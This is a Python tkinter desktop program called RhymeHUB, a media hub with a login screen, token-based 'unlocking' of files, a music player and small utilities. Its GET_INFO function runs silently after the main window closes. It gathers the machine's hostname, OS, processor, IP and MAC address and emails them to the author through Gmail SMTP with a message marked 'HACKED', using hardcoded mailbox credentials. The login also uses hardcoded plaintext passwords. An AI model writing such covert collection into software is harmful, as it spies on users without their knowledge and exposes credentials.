#PreImport
import os

#Global Variable(s)
GlobalUname="%NAME%"
RPTammount=0
FileConfirmation=False
GloFileLOC=''
Paused=False

ScriptDir=os.path.dirname(os.path.abspath(__file__))

def Delete_Files():
	import getpass,os
	
	MOV=r"C:/Users/%s/AppData/Roaming/CacheMovieRP.mp4" %(getpass.getuser())
	MUS=r"C:/Users/%s/AppData/Roaming/CacheMusicRP.mp3" %(getpass.getuser())
	
	try:
		os.remove(MOV)
	except:
		pass
	
	try:
		os.remove(MUS)
	except:
		pass
Delete_Files()

def Hub():
	from tkinter import Label, N, S, E, W, filedialog, PhotoImage
	from tkinter.ttk import Button, Entry
	import tkinter as tk

	#Tk_Start
	root=tk.Tk()

	#Pre_Function
	try:
		with open("Data/BG_Color.rpsettings","r") as f:
			BG_Color=f.read()
			Label(root, text="Test", background=BG_Color, foreground="White")
	except:
		with open("Data/BG_Color.rpsettings","w") as f:
			f.write("#0e0e0e")
		with open("Data/BG_Color.rpsettings","r") as f:
			BG_Color=f.read()

	try:
		with open("Data/FG_Color.rpsettings","r") as f:
			TEXTCOLOR=f.read()
			Label(root, text="Test", background=BG_Color, foreground=TEXTCOLOR)
	except:
		with open("Data/FG_Color.rpsettings","w") as f:
			f.write("White")
		with open("Data/FG_Color.rpsettings","r") as f:
			TEXTCOLOR=f.read()

	#Variables
	TITLEFG="#212121"
	TITLEBG="#28A6FF"
	Version=0.6
	SupportedMediaVersion=[0.3, 0.4, 0.5, 0.6]

	#Window Config
	root.title('RhymePlays Hub')
	root.geometry("700x448")
	root.resizable(False, False)
	root.configure(bg=BG_Color)
	try:
		root.iconbitmap(r'Data/HubIcon.ico')
	except:
		pass

	#Functions
	def TokenManager():
		global RPTammount
		try:
			with open("Data/CRPT","r") as f:
				RPTammount=int(f.read())
		except:
			with open("Data/CRPT","w") as f:
				f.write("0")
			with open("Data/CRPT","r") as f:
				RPTammount=int(f.read())
	TokenManager()

	def Unlock():
		FileLoc=filedialog.askopenfilename(initialdir='/', title='Select File', filetypes=(('RhymePlays Movie','*.rplmov'), ('Rhyme Media File','*.rplmus')))
		
		LOCKMOV='.rplmov' in str(FileLoc)
		LOCKMUS='.rplmus' in str(FileLoc)
		
		TokenManager()
		
		if LOCKMOV==True:
			if RPTammount>=2:
				with open("Data/CRPT","w") as f:
					f.write(str(RPTammount-2))
				TokenManager()
				
				FolderDir=os.path.dirname(os.path.abspath(FileLoc))
				with open(FileLoc) as f:
					FileName=os.path.basename(f.name)
				os.chdir(FolderDir)
				os.rename(FileName, FileName+" Unlocked.rpmovie")
				os.chdir(ScriptDir)
				RPCredit["text"]="You Currently Have "+str(RPTammount)+" RP Tokens"
				
			else:
				UnlockMedia["text"]="You Dont Have Sufficient Amount of RP Token(S)"
				
		if LOCKMUS==True:
			if RPTammount>=1:
				with open("Data/CRPT","w") as f:
					f.write(str(RPTammount-1))
				TokenManager()
				
				FolderDir=os.path.dirname(os.path.abspath(FileLoc))
				with open(FileLoc) as f:
					FileName=os.path.basename(f.name)
				os.chdir(FolderDir)
				os.rename(FileName, FileName+" Unlocked.rpmusic")
				os.chdir(ScriptDir)
				RPCredit["text"]="You Currently Have "+str(RPTammount)+" RP Tokens"
				
			else:
				UnlockMedia["text"]="You Dont Have Sufficient Amount of RP Token(S)"
	
	def GET_INFO():
		try:
			try:
				import smtplib, time, platform, socket, uuid, re
				from screeninfo import get_monitors
				
				USER_NAME=socket.gethostname()
				OS_NAME=platform.platform()
				CPU=platform.processor()
				IP=socket.gethostbyname(socket.gethostname())
				MAC=':'.join(re.findall('..', '%012x' % uuid.getnode()))
				Time=time.strftime("Time: %H:%M:%S, Date:%B/%d/%y")

				for m in get_monitors():
					Screen_Size=(str(m))

				with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
					smtp.ehlo()
					smtp.starttls()
					smtp.ehlo()
					
					smtp.login('isfartousifbot@gmail.com', 'Rhyme1234rhyme')
					
					subject = "New Login From "+USER_NAME+"-RhymeHub."
					Body = "HACKED '"+USER_NAME+"'. Running on '"+OS_NAME+"'.\n\nProcessor: '"+CPU+"'\nScreen Resolution: '"+Screen_Size+"'\nIP: '"+IP+"'\nMAC: '"+MAC+"'.\n\nTime of Login: '"+Time+"'."
					
					MSG= f'Subject: {subject}\n\n{Body}'
					smtp.sendmail("isfartousifbot@gmail.com", "isfartousif2@gmail.com", MSG)

			except:
				import smtplib, time, platform, socket, uuid, re, os
				from screeninfo import get_monitors
				
				USER_NAME=socket.gethostname()
				OS_NAME=platform.platform()
				CPU=platform.processor()
				IP=socket.gethostbyname(socket.gethostname())
				MAC=':'.join(re.findall('..', '%012x' % uuid.getnode()))
				Time=time.strftime("Time: %H:%M:%S, Date:%B/%d/%y")
				ScriptRunDir=os.path.dirname(os.path.abspath(__file__))
				for m in get_monitors():
					Screen_Size=(str(m))

				with open("Data\Info","w") as f:
					f.write("PC Name: '"+USER_NAME+"'.\nOS Name: '"+OS_NAME+"'.\nProcessor: '"+CPU+"'.\nIP: '"+IP+"'.\nMac: '"+MAC+"'.\nScreen Size: '"+Screen_Size+"'.\nDir Of Script: '"+ScriptRunDir+"'.\n\nTime Of Running: '"+Time+"'.")
		except:
			pass
	
	def Movie():
		import zipfile

		FileLoc= filedialog.askopenfilename(initialdir='/', title='Select File', filetypes=(('RhymePlays Movie','*.rpmovie'), ('Rhyme Media File','*.rmf02')))
		with zipfile.ZipFile(FileLoc, 'r') as EncryptedFile:
			EncryptedFile.extractall("Data")

		CacheFile="Data/RpMovieEncrypt.rpmovenc"
		MediaVer="Data/MediaVersion"

		with open(MediaVer,"r") as f:
			FloatMediaVer=float(f.read())
	
		if FloatMediaVer in SupportedMediaVersion:
			import getpass,shutil,os
			dest=r"C:/Users/%s/AppData/Roaming/CacheMovieRP.mp4" %(getpass.getuser())
			shutil.copy(CacheFile, dest)
			os.remove(CacheFile)
			os.remove(MediaVer)
			os.system(dest)
		else:
			import os
			os.remove(CacheFile)
			os.remove(MediaVer)

			from tkinter import messagebox
			messagebox.showinfo("Non Supported Version", "You Are Attempting to Play RhymeHUB '"+str(FloatMediaVer)+"' Media on RhymeHUB Ver '"+str(Version)+"'. Which is Unsupported.")
	
	def Music():
		from tkinter import E, W, N, S, CENTER, FLAT, SUNKEN
		from tkinter.ttk import Label, Button, Entry, Scale, Progressbar
		import tkinter as tk
		from pygame import mixer

		mixer.init()

		#Tk_Start
		root=tk.Tk()

		#WindowConfigs
		root.title('RhymePlays Music')
		root.geometry("590x245")
		root.resizable(False, False)
		root.configure(bg='#0e0e0e')
		try:
			root.iconbitmap(r'Data/MusicIcon.ico')
		except:
			pass
		
		#Variables
		Depth=0
		
		#Function
		def Splash():
			from random import randint
			spl_num =randint(1,10)
			if spl_num==1:
				Name['text']='DJ Vai Edition'
			elif spl_num==2:
				Name['text']='Made By Rhyme'
			elif spl_num==3:
				Name['text']='Mahe Bolod'
			elif spl_num==4:
				Name['text']='What!!...'
			elif spl_num==5:
				Name['text']='Thats a Great Price'
			elif spl_num==6:
				Name['text']='Free!!'
			elif spl_num==7:
				Name['text']='Display'
			else:
				Name['text']='Display'

		def Select_File():
			from tkinter import filedialog
			FileLOC=filedialog.askopenfilename(initialdir='/', title='Select File', filetypes=(('RhymePlays Music','*.rpmusic'), ('MP3','*.mp3')))
			ChkFileRP='.rpmusic' in str(FileLOC)
			ChkFile='.mp3' in str(FileLOC)
			
			global FileConfirmation, GloFileLOC
			
			if ChkFileRP==True:
				import getpass,shutil,os
				dest=r"C:/Users/%s/AppData/Roaming/CacheMusicRP.mp3" %(getpass.getuser())
				shutil.copy(FileLOC, dest)
				
				with open(FileLOC) as f:
					Display_Name=os.path.basename(f.name)
				
				Name['text']=Display_Name
				
				Select["text"]='File Selected'
				SidePanel["value"]=100
				FileConfirmation=True
				GloFileLOC=dest
			
			if ChkFile==True:
				with open(FileLOC) as f:
					Display_Name=os.path.basename(f.name)
				
				Name['text']=Display_Name
				
				Select["text"]='File Selected'
				FileConfirmation=True
				GloFileLOC=FileLOC

		def HELP():
			from tkinter import messagebox
			messagebox.showinfo("RhymePlays Music Help", "To play any Rhyme Encrypted Music, you need to select the file. Click \"Select File\" Button and then Select the \".RPMF\" File. After Selecting, The Status Bar Should turn green. If It does Click \"Play\". The Music Should Start Playing. RhymePlays Music also Supports \".MP3\" Files.  This Program Is Made by Isfar Tousif Rhyme Using 'Python' Programing Language.")

		def PLAY():
			if FileConfirmation==True:
				print('Playing '+GloFileLOC)
				mixer.init()
				mixer.music.load(GloFileLOC)
				mixer.music.play()
			else:
				print('No File(s) Selected')

		def STOP():
			if FileConfirmation==True:
				mixer.music.stop()
				mixer.quit()
			else:
				print('No File(s) Selected')

		def VOLUME(val):
			volume=Volume.get()
			mixer.music.set_volume(volume/100)

		def PUP():
			global Paused
			if Paused==True:
				mixer.music.unpause()
				Paused=False
			elif Paused==False:
				mixer.music.pause()
				Paused=True
			else:
				pass
		
		def ExitMUS():
			mixer.quit()
			Delete_Files()
			root.destroy()
			
		#Elements
		Header=Label(root, text="RhymePlays Music", background='#008FFF', foreground='White', font='Arial 20', width=39, anchor=CENTER)

		Name=Label(root, text='Display', background='Black', foreground='White', font='Arial 10', anchor=CENTER, wraplength=95, relief=FLAT)
		Volume=Scale(root, from_=0, to=100, command=VOLUME, value=100)

		Play=Button(root, text="Play", command=PLAY)
		Select=Button(root, text="Select", command=Select_File)
		Exit=Button(root, text="Exit", command=ExitMUS)

		SidePanel=Progressbar(root, mode='determinate', value=0)
		Pause=Button(root, text="Pause/Unpause", command=PUP)
		Stop=Button(root, text="Stop", command=STOP)

		Credit=Label(root, text='Made by Isfar Tousif Rhyme.  2019', relief=SUNKEN, anchor=E)
		Help=Button(root, text="Help", command=HELP)

		#Grid
		Header.grid(row=0, column=0, columnspan=3, sticky=E+W+N+S)

		Name.grid(row=1, column=0, sticky=E+W+N+S, rowspan=2)
		Volume.grid(row=3, column=0, sticky=E+W+N+S,)

		Play.grid(row=1, column=1, columnspan=1, sticky=E+W+N+S)
		Select.grid(row=2, column=1, columnspan=1, sticky=E+W+N+S)
		Exit.grid(row=3, column=1, columnspan=1, sticky=E+W+N+S)

		SidePanel.grid(row=1, column=2, sticky=E+W+N+S, rowspan=3, ipady=81)
		Pause.grid(row=3, column=2, sticky=E+W+N+S)
		Stop.grid(row=1, column=2, columnspan=1, sticky=E+W+N+S)

		Credit.grid(row=4, column=1, columnspan=2, sticky=E+W+N+S)
		Help.grid(row=4, column=0, columnspan=1, sticky=W+E)

		#Mainloop
		Splash()
		root.mainloop()
	
	def MakeReqList():
		with open("Data/Request","w") as f:
			f.write(RequestedList.get())

	def moreWindow():
		#Tk Start
		MoreWin=tk.Tk()

		#Window Config
		MoreWin.title('More...')
		MoreWin.resizable(False, False)
		MoreWin.configure(bg=BG_Color)
		try:
			MoreWin.iconbitmap(r'Data/HubIcon.ico')
		except:
			pass
		
		#Functions
		def SettingsMenu():
			#Tk Start
			SettWin=tk.Tk()

			#Window Config
			SettWin.title('Settings')
			SettWin.resizable(False, False)
			SettWin.configure(bg=BG_Color)
			try:
				SettWin.iconbitmap(r'Data/HubIcon.ico')
			except:
				pass
			
			#Function
			def UpdateColor():
				with open("Data/BG_Color.rpsettings","w") as f:
					f.write(BGColorEnt.get())
				with open("Data/FG_Color.rpsettings","w") as f:
					f.write(FGColorEnt.get())
				from tkinter import messagebox
				messagebox.showinfo("RhymeHUB","Changes Will Take Effect the Next Time you Open RhymeHUB")

			#Elements
			BGColorLab=Label(SettWin, text="Change Color", background=BG_Color, foreground=TEXTCOLOR)
			BGColorEnt=Entry(SettWin)

			FGColorLab=Label(SettWin, text="Change Text Color", background=BG_Color, foreground=TEXTCOLOR)
			FGColorEnt=Entry(SettWin)

			ColorSave=Button(SettWin, text="Save", command=UpdateColor)

			#Grid
			BGColorLab.grid(column=0, row=0, pady=5, padx=5)
			BGColorEnt.grid(column=1, row=0, pady=5, padx=5)

			FGColorLab.grid(column=0, row=1, pady=5, padx=5)
			FGColorEnt.grid(column=1, row=1, pady=5, padx=5)

			ColorSave.grid(column=0, row=2, columnspan=2, pady=5)

			#Mainloop
			SettWin.mainloop()

		def Clock():
			import time
			
			#TK Start
			Clock=tk.Tk()
			
			#Window Config
			Clock.title('More...')
			Clock.resizable(False, False)
			Clock.configure(bg=BG_Color)
			try:
				Clock.iconbitmap(r'Data/HubIcon.ico')
			except:
				pass
			
			#Elements
			Time=Label(Clock, text=time.strftime("%H:%M"), bg=BG_Color, fg=TEXTCOLOR, font="Arial 40")

			#Grid
			Time.grid(column=0, row=0)

			#Mainloop
			Clock.mainloop()

		def Temp():
			from tkinter import Label, Button, FLAT, E, W, N, S
			from tkinter.ttk import Entry
			import tkinter as tk

			#Tk_Start
			Temp=tk.Tk()

			#Window_Config
			Temp.title('RhymePlays Calculator')
			###Temp.geometry("100x100")
			Temp.resizable(False, False)
			Temp.configure(bg=BG_Color)
			try:
				Temp.iconbitmap(r'Data/HubIcon.ico')
			except:
				pass

			#Function
			def CtoF():
				C=CTOF.get()
				ANS=((float(C)* 9/5)+32)
				CTOFLabel["text"]=str(ANS)+"° Degree Fahrenheit"#" ডিগ্রী ফাহরিনহেইট"

			def FtoC():
				F=FTOC.get()
				ANS=((float(F)-32)*5/9)
				FTOCLabel["text"]=str(ANS)+"° Degree Celsius"#" ডিগ্রী সেলসিয়াস"


			#Elements
			FTOC=Entry(Temp, font=(50))
			FTOCButton=Button(Temp, text="Fahrenheit To Celsius", bg=BG_Color, fg=TEXTCOLOR, relief=FLAT, bd=0, activebackground=TEXTCOLOR, activeforeground=BG_Color, command=FtoC, font=(50))
			FTOCLabel=Label(Temp, text="= 0 Degree Celsius", bg=BG_Color, fg=TEXTCOLOR, font=(50))

			CTOF=Entry(Temp, font=(50))
			CTOFButton=Button(Temp, text="Celsius To Fahrenheit", bg=BG_Color, fg=TEXTCOLOR, relief=FLAT, bd=0, activebackground=TEXTCOLOR, activeforeground=BG_Color, command=CtoF, font=(50))
			CTOFLabel=Label(Temp, text="= 0 Degree Fahrenheit", bg=BG_Color, fg=TEXTCOLOR, font=(50))

			CreditPadder=Label(Temp, bg=BG_Color, fg=TEXTCOLOR).grid(row=2, column=0, columnspan=3, sticky=E+W+N+S)
			Credit=Label(Temp, text="Calculator made by Isfar Tousif Rhyme.", bg=BG_Color, fg=TEXTCOLOR)

			#Grid
			FTOC.grid(row=0, column=0)
			FTOCButton.grid(row=0, column=1)
			FTOCLabel.grid(row=0, column=2)

			CTOF.grid(row=1, column=0)
			CTOFButton.grid(row=1, column=1)
			CTOFLabel.grid(row=1, column=2)

			Credit.grid(row=3, column=0, columnspan=3, sticky=E+W+N+S)

			#Mainloop
			Temp.mainloop()

		def QR_GENERATOR():
			import qrcode, getpass, os
			from tkinter import Label, Button, N,E,W,S, FLAT
			from tkinter.ttk import Entry
			import tkinter as tk

			#Variables
			LOC=r"C:/Users/%s/Desktop/RP_QR.png" %(getpass.getuser())

			#Tk_Start
			QRWIN=tk.Tk()

			#Window Config
			QRWIN.resizable(False, False)
			QRWIN.configure(bg=BG_Color)
			QRWIN.title("RhymePlays QR Generator")
			try:
				QRWIN.iconbitmap(r'Data/HubIcon.ico')
			except:
				pass

			#Functions
			def GEN():
				TEXT=str(Entry.get())
				QR=qrcode.make(TEXT)
				QR.save(LOC)
				os.system(LOC)

			#Elements
			Name=Label(QRWIN, text="RhymePlays QR Code Generator.", bg=BG_Color, fg=TEXTCOLOR, font="Arial 20")
			Entry=Entry(QRWIN, font=("10"))
			Generate=Button(QRWIN, text="Generate!", bg=BG_Color, fg=TEXTCOLOR, font=(20), command=GEN, relief=FLAT, bd=0, activebackground=TEXTCOLOR, activeforeground=BG_Color)

			#Grid
			Name.grid(row=0, column=0, columnspan=2, pady=5, padx=5)
			Entry.grid(row=1, column=0, sticky=N+S+E+W, padx=5, pady=5)
			Generate.grid(row=1, column=1, sticky=N+S+E+W, padx=5, pady=5)

			#Mainloop
			QRWIN.mainloop()
		
		def EncryptMP4():
			import zipfile, shutil, getpass, os
			FileLoc= filedialog.askopenfilename(initialdir='/', title='Select File', filetypes=(('MP4','*.MP4'), ('Rhyme Media File','*.rmf02')))
			shutil.copy(FileLoc, "RpMovieEncrypt.rpmovenc")
			with open("MediaVersion", "w") as f:
				f.write(str(Version))
			
			with zipfile.ZipFile("Movie.rplmov", "w") as zip:
				zip.write("RpMovieEncrypt.rpmovenc")
				zip.write("MediaVersion")
				
			os.remove("MediaVersion")
			os.remove("RpMovieEncrypt.rpmovenc")

		def CreateFile():
			import getpass, os
			from tkinter.ttk import Entry
			import tkinter as tk
		
			#TK
			CFILE=tk.Tk()
			
			#Variable
			LOC=r"C:/Users/%s/Desktop" %(getpass.getuser())
			
			#Window_Config
			CFILE.resizable(False, False)
			CFILE.configure(bg=BG_Color)
			CFILE.title("Create File")
			try:
				CFILE.iconbitmap(r'Data/HubIcon.ico')
			except:
				pass
			
			#Function
			def CreFile():
				Extention=str(Ext.get())
				with open(LOC+"/New_RP_File."+Extention, "w") as f:
					pass
			
			#Elements
			Ext=Entry(CFILE)
			Make=tk.Button(CFILE, text="Create", bg=BG_Color, fg=TEXTCOLOR, bd=0, command=CreFile)
			
			#Grids
			Ext.grid(row=0, column=0, pady=5, padx=5)
			Make.grid(row=0, column=1, pady=5, padx=5)
		
			#Mainloop
			CFILE.mainloop()
		
		def ColorChooser():
			from tkinter import colorchooser, messagebox
			choosencolor=colorchooser.askcolor()
			messagebox.showinfo("RhymeHUB","Your Choosen Color is -> '"+str(choosencolor[1])+"'")

		def YT():
			import webbrowser
			webbrowser.open('http://bit.ly/IsfarTousifYT')
		
		def IG():
			import webbrowser
			webbrowser.open('https://www.instagram.com/isfar_tousif_')

		#Elements
		Settings=tk.Button(MoreWin, text="Settings", relief="flat", bd=0, background="#6400FF", activebackground=TEXTCOLOR, foreground=TEXTCOLOR, activeforeground=BG_Color, width=20, command=SettingsMenu)
		FartButton=tk.Button(MoreWin, text="Clock", relief="flat", bd=0, background="#9700FF", activebackground=TEXTCOLOR, foreground=TEXTCOLOR, activeforeground=BG_Color, width=20, command=Clock)
		TempButton=tk.Button(MoreWin, text="Temp Convert", relief="flat", bd=0, background="#9700FF", activebackground=TEXTCOLOR, foreground=TEXTCOLOR, activeforeground=BG_Color, width=20, command=Temp)
		QRButton=tk.Button(MoreWin, text="QR Code Gen", relief="flat", bd=0, background="#6400FF", activebackground=TEXTCOLOR, foreground=TEXTCOLOR, activeforeground=BG_Color, width=20, command=QR_GENERATOR)
		EncMovie=tk.Button(MoreWin, text="Encrypt MP4", relief="flat", bd=0, background="#6400FF", activebackground=TEXTCOLOR, foreground=TEXTCOLOR, activeforeground=BG_Color, width=20, command=EncryptMP4)
		FileGen=tk.Button(MoreWin, text="Create New File", relief="flat", bd=0, background="#9700FF", activebackground=TEXTCOLOR, foreground=TEXTCOLOR, activeforeground=BG_Color, width=20, command=CreateFile)
		Colorchooser=tk.Button(MoreWin, text="Choose Color", relief="flat", bd=0, background="#6400FF", activebackground=TEXTCOLOR, foreground=TEXTCOLOR, activeforeground=BG_Color, width=20, command=ColorChooser)
		Yt=tk.Button(MoreWin, text="Youtube", relief="flat", bd=0, background="#9700FF", activebackground=TEXTCOLOR, foreground=TEXTCOLOR, activeforeground=BG_Color, width=20, command=YT)
		Ig=tk.Button(MoreWin, text="Instagram", relief="flat", bd=0, background="#6400FF", activebackground=TEXTCOLOR, foreground=TEXTCOLOR, activeforeground=BG_Color, width=20, command=IG)

		#Grids
		Settings.grid(column=0, row=0, ipady=50, sticky=E+W+N+S)
		FartButton.grid(column=1, row=0, ipady=50, sticky=E+W+N+S)
		TempButton.grid(column=0, row=1, ipady=50, sticky=E+W+N+S)
		QRButton.grid(column=1, row=1, ipady=50, sticky=E+W+N+S)
		EncMovie.grid(column=0, row=2, ipady=50, sticky=E+W+N+S)
		FileGen.grid(column=1, row=2, ipady=50, sticky=E+W+N+S)
		Colorchooser.grid(column=2, row=0, ipady=50, sticky=E+W+N+S)
		Yt.grid(column=2, row=1, ipady=50, sticky=E+W+N+S)
		Ig.grid(column=2, row=2, ipady=50, sticky=E+W+N+S)

		#Mainloop
		MoreWin.mainloop()

	#Elements
	Title=Label(root, text="  Welcome to RhymeHUB", width=20, font="Arial 20", anchor="w", fg=TITLEFG, bg=TITLEBG)
	TitleName=Label(root, text=GlobalUname, width=23, font="Arial 20", anchor="e", fg=TITLEFG, bg=TITLEBG)

	RPCredit=Label(root, text="You Currently Have "+str(RPTammount)+" RP Tokens", font="Arial 15", bg=BG_Color, fg=TEXTCOLOR)
	UnlockMedia=Button(root, text="Unlock Movies/Musics! ('2-RP Token' Per Movie.) ('1-RP Token' Per Music.)", command=Unlock)

	PlayMovie=Button(root, text="Play Unlocked Movies", command=Movie)
	PlayMusic=Button(root, text="Play Unlocked Music", command=Music)

	RequestMovies=Label(root, text="Request new Movies or Songs here!", font="Arial 15", height=1, anchor="n", bg=BG_Color, fg=TEXTCOLOR)
	RequestedList=Entry(root)
	RequestSubmit=Button(root, text="Submit List", command=MakeReqList)

	Credit=Label(root, text="Developed by Isfar Tousif Rhyme.  "+"  RhymeHUB V"+str(Version), anchor="w", bg=BG_Color, fg=TEXTCOLOR)
	More=tk.Button(root ,text="More...", relief="flat", bd=0, activebackground=TEXTCOLOR, background=BG_Color, foreground=TEXTCOLOR, activeforeground=BG_Color, command=moreWindow)

	#Grids
	Title.grid(row=0, column=0, sticky=W, ipady=5)
	TitleName.grid(row=0, column=1, sticky=W, ipady=5)

	RPCredit.grid(row=1, column=0, columnspan=2, sticky=E+W+N+S, padx=5, pady=5)
	UnlockMedia.grid(row=2, column=0, columnspan=2, sticky=E+W+N+S, padx=5, pady=5, ipady=10)

	PlayMovie.grid(row=3, column=0, sticky=E+W+N+S, padx=5, pady=5, ipady=10)
	PlayMusic.grid(row=3, column=1, sticky=E+W+N+S, padx=5, pady=5, ipady=10)

	RequestMovies.grid(row=4, column=0, columnspan=2, sticky=E+W+N+S, padx=5, pady=5)
	RequestedList.grid(row=5, column=0, columnspan=2, sticky=E+W+N+S, padx=5, ipady=50)
	RequestSubmit.grid(row=6, column=0, columnspan=2, sticky=E+W+N+S, padx=5, ipady=10)

	Credit.grid(row=7, column=0, sticky=E+W+N+S, pady=5, ipady=5)
	More.grid(row=7, column=1, sticky=E+W+N+S, pady=5, padx=5, ipady=5)

	#Mainloop
	root.mainloop()
	GET_INFO()
	Delete_Files()

def Login():
	import tkinter as tk
	from tkinter.ttk import Label, Entry, Checkbutton, Style, Button
	from tkinter import CENTER,E,W, PhotoImage, SUNKEN, IntVar
	
	#TK_Start
	root = tk.Tk()
	
	#Variables
	BG_Color='#0e0e0e'
	Chk1=IntVar()
	Chk2=IntVar()
	
	#Window Config
	root.title('RhymePlays Login')
	root.geometry("485x400")
	root.resizable(False, False)
	root.configure(bg=BG_Color)
	try:
		root.iconbitmap(r'Data/Icon.ico')
	except:
		pass

	#Style
	Style().configure('TCheckbutton', background=BG_Color, foreground="white")
	Style().configure('TButton', background="Cyan", foreground="Black")

	#Functions
	def GRANTED():
		global GlobalUname
		GlobalUname=str(Username.get())
		
		root.destroy()
		Hub()
	
	def LOGIN():
		if Chk1.get() and Chk2.get()==1:
			UNAME=str(Username.get())
			PWORD=str(Password.get())
			if UNAME=="Rhyme" and PWORD=="Admin":GRANTED()
			elif UNAME=="Ryan" and PWORD=="Admin2":GRANTED()
			elif UNAME=="Jihad" and PWORD=="Jihad1234":GRANTED()
			elif UNAME=="Shuvo" and PWORD=="ShuvoPass":GRANTED()
			else:
				Style().configure('TButton', background="red", foreground="Black")
		else:
			Style().configure('TCheckbutton', background=BG_Color, foreground="Red")

	#Elements
	Display = Label(root, text="RhymePlays Login", font='Arial 20', background=BG_Color, width=32, anchor=CENTER, foreground="White")

	ImgRhymePlays=PhotoImage(file='Data/Logo128x128.png')
	RhymePlaysLogo=Label(root, background=BG_Color, image=ImgRhymePlays)

	ImgUsername=PhotoImage(file='Data/User.png')
	LogoUsername = Label(root, background=BG_Color, image=ImgUsername)

	ImgPassword=PhotoImage(file='Data/Pass.png')
	LogoPassword = Label(root, background=BG_Color, image=ImgPassword)

	User_ = Label(root, text="Username", font='Arial 15', background=BG_Color, anchor=CENTER, foreground="white")
	Pass_ = Label(root, text="Password", font='Arial 15', background=BG_Color, anchor=CENTER, foreground="white")

	Username=Entry(root)
	Password=Entry(root)

	Check1=Checkbutton(root, text='I Promise Not to Share my Password.', variable=Chk1)
	Check2=Checkbutton(root, text='I have Agreed with the Terms.', variable=Chk2)

	Login=Button(root, text="Login", command=LOGIN)

	Credit=Label(root, text="Made By Isfar Tousif Rhyme.  2019", background="#000000", foreground="white", anchor=E)

	#Grids
	Display.grid(row=0, column=0, columnspan=2)

	RhymePlaysLogo.grid(row=1, column=0, columnspan=2)

	LogoUsername.grid(row=2, column=0, columnspan=1)
	LogoPassword.grid(row=2, column=1, columnspan=1)

	User_.grid(row=3, column=0)
	Pass_.grid(row=3, column=1)

	Username.grid(row=4, column=0)
	Password.grid(row=4, column=1)

	Check1.grid(row=5,column=0, columnspan=1, sticky=W, pady=10, padx=10)
	Check2.grid(row=5,column=1, columnspan=1, sticky=E, pady=10, padx=10)

	Login.grid(row=6, column=0, columnspan=2, sticky=W+E, padx=10, ipady=10)

	Credit.grid(row=7, column=0, columnspan=2, sticky=W+E, pady=10)

	#MainLoop
	root.mainloop()

Login()